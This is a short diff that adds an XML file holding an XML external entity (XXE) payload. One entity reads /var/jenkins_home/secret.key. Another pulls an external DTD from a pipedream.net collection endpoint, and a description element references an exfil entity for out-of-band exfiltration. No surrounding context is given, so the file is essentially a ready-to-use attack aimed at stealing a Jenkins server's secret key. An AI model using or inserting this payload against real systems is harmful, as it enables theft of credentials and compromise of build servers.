@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+        <!ENTITY % data SYSTEM "file:///var/jenkins_home/secret.key">
+        <!ENTITY % oob SYSTEM "<https://eozqaulxtdlixhg.m.pipedream.net>">%oob;
+]>
+<description>&exfil;</description>
